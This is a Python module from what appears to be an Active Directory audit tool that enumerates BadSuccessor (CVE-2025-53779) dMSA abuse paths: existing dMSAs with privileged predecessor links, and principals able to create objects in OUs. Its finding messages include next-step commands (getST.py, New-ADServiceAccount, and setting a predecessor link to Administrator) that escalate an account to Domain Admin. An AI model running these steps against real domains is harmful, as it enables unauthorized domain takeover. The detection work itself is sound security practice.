"""
BadSuccessor enumeration (CVE-2025-53779 — dMSA abuse on Server 2025).

Three complementary checks:

  1. **Functional-level gate.** dMSA objects only exist on Server 2025
     domains (FL = 10). On older FLs the attack path is impossible;
     report INFO and skip the rest so we don't generate false-positive
     "you should fix the Server 2025 thing" findings against domains
     that don't have it.

  2. **Existing dMSA inventory + predecessor links.** Every
     ``msDS-DelegatedManagedServiceAccount`` already in the directory.
     If ``msDS-ManagedAccountPrecededByLink`` points at a privileged
     account (Domain Admin, krbtgt, AD CS service account, etc.) the
     attack has already been staged — the KDC will merge that account's
     PAC into the dMSA's TGT on first auth. CRITICAL.

  3. **OU CreateChild permission audit.** Per Akamai's research, write
     permission on *any* OU is sufficient — the attacker creates a
     dMSA in the OU they control, sets the predecessor link to a DA,
     and waits. We enumerate every principal with CreateChild on every
     OU/container, exclude well-known privileged groups, and flag the
     rest. The set of principals × OUs that meet this is the precise
     attack-path graph an operator needs.

References:
- Akamai (Yuval Gordon): https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory
- Get-BadSuccessorOUPermissions.ps1 (the reference defender script)
- Brief §4.3 (broader dMSA / GMSA enumeration)
"""

from __future__ import annotations

from kerb_map.acl import (
    ADS_RIGHT_DS_CREATE_CHILD,
    ADS_RIGHT_GENERIC_ALL,
    ADS_RIGHT_GENERIC_WRITE,
    ADS_RIGHT_WRITE_DAC,
    ADS_RIGHT_WRITE_OWNER,
    OBJECT_CLASS_DMSA,
    is_well_known_privileged,
    parse_sd,
    resolve_sids,
    sd_control,
    walk_aces,
)
from kerb_map.ldap_helpers import attr, attrs
from kerb_map.plugin import Finding, Module, ScanContext, ScanResult, register

SERVER_2025_FL = 10


@register
class BadSuccessor(Module):
    name = "BadSuccessor (CVE-2025-53779)"
    flag = "badsuccessor"
    description = "Enumerate dMSA abuse paths on Server 2025 domains"
    category = "attack-path"
    in_default_run = True

    def scan(self, ctx: ScanContext) -> ScanResult:
        # Gate on schema-presence rather than functional level. Field
        # bug from the v1.3 sprint Server 2025 lab: the dc25 box ships
        # with the Server 2025 schema (which has the dMSA class) but
        # was promoted with `WinThreshold` forest mode (FL=7) for
        # compatibility — a legitimate forest-upgrade transition state.
        # The old FL gate skipped here even though dMSAs were
        # query-able. Schema-presence is the actual constraint:
        # ldap3 raises LDAPObjectClassError when the class isn't
        # in the schema, so we pre-flight via _has_dmsa_schema().
        if not _has_dmsa_schema(ctx.ldap):
            fl = (ctx.domain_info or {}).get("fl_int") or 0
            return ScanResult(
                raw={
                    "applicable": False,
                    "reason":     (
                        f"schema lacks msDS-DelegatedManagedServiceAccount "
                        f"(domain functional level {fl}); dMSA not present"
                    ),
                },
            )

        existing_findings, dmsa_raw = self._inventory_existing_dmsas(ctx)
        ou_findings, ou_raw         = self._audit_ou_create_child(ctx)

        return ScanResult(
            raw={
                "applicable":     True,
                "functional_level": (ctx.domain_info or {}).get("fl_int") or 0,
                "existing_dmsas": dmsa_raw,
                "ou_writers":     ou_raw,
                "summary": {
                    "existing_count":           len(dmsa_raw),
                    "with_privileged_predecessor": sum(
                        1 for d in dmsa_raw if d.get("predecessor_privileged")
                    ),
                    "ous_with_non_default_writer": len(ou_raw),
                },
            },
            findings=existing_findings + ou_findings,
        )

    # ------------------------------------------------------------------ #
    #  1. Existing dMSAs                                                 #
    # ------------------------------------------------------------------ #

    def _inventory_existing_dmsas(self, ctx: ScanContext) -> tuple[list[Finding], list[dict]]:
        entries = ctx.ldap.query(
            search_filter="(objectClass=msDS-DelegatedManagedServiceAccount)",
            attributes=[
                "sAMAccountName", "distinguishedName", "objectSid",
                "msDS-ManagedAccountPrecededByLink",
                "msDS-DelegatedMSAState", "whenCreated",
            ],
        )

        # Resolve any predecessor DNs in one batch — much cheaper than
        # one-query-per-dMSA on a domain with hundreds of them.
        predecessor_dns: set[str] = set()
        for e in entries:
            for link in attrs(e, "msDS-ManagedAccountPrecededByLink"):
                if link:
                    predecessor_dns.add(str(link))

        predecessor_lookup: dict[str, dict] = {}
        if predecessor_dns:
            for dn in predecessor_dns:
                # One query per DN is unavoidable here without a custom
                # extensibleMatch filter; a typical domain has few dMSAs.
                hits = ctx.ldap.query(
                    search_filter="(objectClass=*)",
                    attributes=["sAMAccountName", "memberOf", "adminCount", "objectSid"],
                    search_base=dn,
                )
                if hits:
                    h = hits[0]
                    predecessor_lookup[dn] = {
                        "sAMAccountName":   attr(h, "sAMAccountName"),
                        "memberOf":         [str(g) for g in attrs(h, "memberOf")],
                        "adminCount":       attr(h, "adminCount"),
                    }

        findings: list[Finding] = []
        raw: list[dict] = []
        for e in entries:
            sam = attr(e, "sAMAccountName") or ""
            dn  = attr(e, "distinguishedName") or ""
            links = [str(x) for x in attrs(e, "msDS-ManagedAccountPrecededByLink")]
            state = attr(e, "msDS-DelegatedMSAState")

            predecessor_priv = False
            predecessor_sams: list[str] = []
            for link in links:
                p = predecessor_lookup.get(link, {})
                if p.get("sAMAccountName"):
                    predecessor_sams.append(p["sAMAccountName"])
                if p.get("adminCount") == 1 or self._memberof_implies_priv(p.get("memberOf", [])):
                    predecessor_priv = True

            entry_dict = {
                "sAMAccountName":           sam,
                "distinguishedName":        dn,
                "predecessors":             predecessor_sams or links,
                "predecessor_privileged":   predecessor_priv,
                "delegated_msa_state":      state,
                "when_created":             attr(e, "whenCreated"),
            }
            raw.append(entry_dict)

            if predecessor_priv:
                findings.append(Finding(
                    target=sam or dn,
                    attack="BadSuccessor (staged)",
                    severity="CRITICAL",
                    priority=98,
                    reason=(
                        f"dMSA {sam} has msDS-ManagedAccountPrecededByLink → "
                        f"{', '.join(predecessor_sams) or links} (privileged). "
                        f"On first authentication the KDC merges the predecessor's "
                        f"PAC into the dMSA's TGT — full CVE-2025-53779 chain "
                        f"is staged."
                    ),
                    next_step=(
                        f"# 1. Confirm the link from another vantage point\n"
                        f"# 2. Authenticate as the dMSA — the resulting TGT carries DA membership\n"
                        f"getST.py -spn 'cifs/<DC_NAME>' -dc-ip {ctx.dc_ip} "
                        f"{ctx.domain}/{sam} -k -no-pass\n"
                        f"# 3. Treat resulting ticket as the privileged predecessor\n"
                        f"# Mitigation: REMOVE the predecessor link in AD; this is "
                        f"not a configuration kerb-map should leave intact."
                    ),
                    category="attack-path",
                    mitre="T1078.002",  # Domain Accounts (privilege escalation via dMSA)
                    data={
                        "dmsa_dn":         dn,
                        "predecessors":    predecessor_sams or links,
                        "domain_sid":      ctx.domain_sid,
                        "delegated_msa_state": state,
                    },
                ))

        return findings, raw

    @staticmethod
    def _memberof_implies_priv(member_of: list) -> bool:
        s = ",".join(str(m).lower() for m in member_of)
        return any(g in s for g in (
            "cn=domain admins,",
            "cn=enterprise admins,",
            "cn=schema admins,",
            "cn=administrators,",
            "cn=account operators,",
            "cn=backup operators,",
        ))

    # ------------------------------------------------------------------ #
    #  2. OU CreateChild audit — the BadSuccessor primitive              #
    # ------------------------------------------------------------------ #

    def _audit_ou_create_child(self, ctx: ScanContext) -> tuple[list[Finding], list[dict]]:
        # Pull every OU + container with its DACL. Containers (CN=Users
        # by default) are equally fair game for dMSA placement.
        ous = ctx.ldap.query(
            search_filter="(|(objectClass=organizationalUnit)(objectClass=container))",
            attributes=["distinguishedName", "nTSecurityDescriptor"],
            controls=sd_control(),
        )

        candidates: list[tuple[str, str]] = []  # (ou_dn, principal_sid)
        for e in ous:
            ou_dn = attr(e, "distinguishedName") or ""
            sd = parse_sd(attr(e, "nTSecurityDescriptor"))
            if sd is None:
                continue
            for ace in walk_aces(sd, object_dn=ou_dn):
                if is_well_known_privileged(ace.trustee_sid):
                    continue
                if not self._can_create_dmsa(ace):
                    continue
                candidates.append((ou_dn, ace.trustee_sid))

        if not candidates:
            return [], []

        names = resolve_sids(ctx.ldap, {sid for _, sid in candidates}, ctx.base_dn)
        findings: list[Finding] = []
        raw: list[dict] = []
        for ou_dn, sid in candidates:
            who = names.get(sid, {})
            sam = who.get("sAMAccountName") or sid
            raw.append({"ou": ou_dn, "principal_sid": sid, "principal_sam": sam})
            findings.append(Finding(
                target=f"{sam} on {ou_dn}",
                attack="BadSuccessor (writable OU)",
                severity="HIGH",
                priority=88,
                reason=(
                    f"{sam} can create child objects on {ou_dn} on a Server 2025 "
                    f"domain — combined with dMSA creation rights this is the "
                    f"BadSuccessor primitive (CVE-2025-53779)."
                ),
                next_step=(
                    f"# As {sam}, create a dMSA in the writable OU and link it to a DA:\n"
                    f"# (PowerShell, on a Server 2025 join)\n"
                    f"New-ADServiceAccount -Name 'kerbmap_dmsa' -Path '{ou_dn}' "
                    f"-Type 'DelegatedManagedServiceAccount' "
                    f"-DNSHostName 'kerbmap_dmsa.{ctx.domain}'\n"
                    f"Set-ADComputer -Identity 'kerbmap_dmsa$' "
                    f"-Add @{{'msDS-ManagedAccountPrecededByLink'='CN=Administrator,CN=Users,{ctx.base_dn}'}}\n"
                    f"# Then: getST -k -no-pass {ctx.domain}/kerbmap_dmsa$ → DA TGT"
                ),
                category="attack-path",
                mitre="T1078.002",
                data={
                    "ou_dn":         ou_dn,
                    "principal_sid": sid,
                    "principal_sam": sam,
                    "domain_sid":    ctx.domain_sid,
                    "fl_int":        ctx.domain_info.get("fl_int"),
                },
            ))
        return findings, raw

    @staticmethod
    def _can_create_dmsa(ace) -> bool:
        """An ACE permits dMSA creation if it grants any of:
          * GENERIC_ALL / GENERIC_WRITE / WRITE_DAC / WRITE_OWNER
          * CreateChild on the dMSA object class (or any object class)
        The dMSA-specific GUID is the strongest signal; CreateChild
        without a GUID is broader and equally exploitable.
        """
        if ace.has_right(
            ADS_RIGHT_GENERIC_ALL | ADS_RIGHT_GENERIC_WRITE
            | ADS_RIGHT_WRITE_DAC | ADS_RIGHT_WRITE_OWNER
        ):
            return True
        if not ace.has_right(ADS_RIGHT_DS_CREATE_CHILD):
            return False
        # CreateChild with no specific GUID = create any class
        if ace.object_type_guid is None:
            return True
        return ace.object_type_guid.lower() == OBJECT_CLASS_DMSA


def _has_dmsa_schema(ldap_client) -> bool:
    """Check whether the bound DC's schema knows the dMSA class.

    Replaces the prior FL-based gate (which silently skipped on
    legitimate forest-upgrade transition states where the schema
    was Server 2025 but the FL was lower). ldap3 with
    ``get_info=ALL`` populates ``server.schema`` from the rootDSE
    during connect; walk the cached object_classes. On any
    failure (older ldap3, partial-init mock LDAP), default to
    True so the query attempts and ldap_client logs the error
    rather than silently skipping a real Server 2025 estate."""
    try:
        schema = ldap_client.conn.server.schema
        if schema is None or not getattr(schema, "object_classes", None):
            return True
        wanted = "msds-delegatedmanagedserviceaccount"
        return any(name.lower() == wanted for name in schema.object_classes)
    except Exception:
        return True
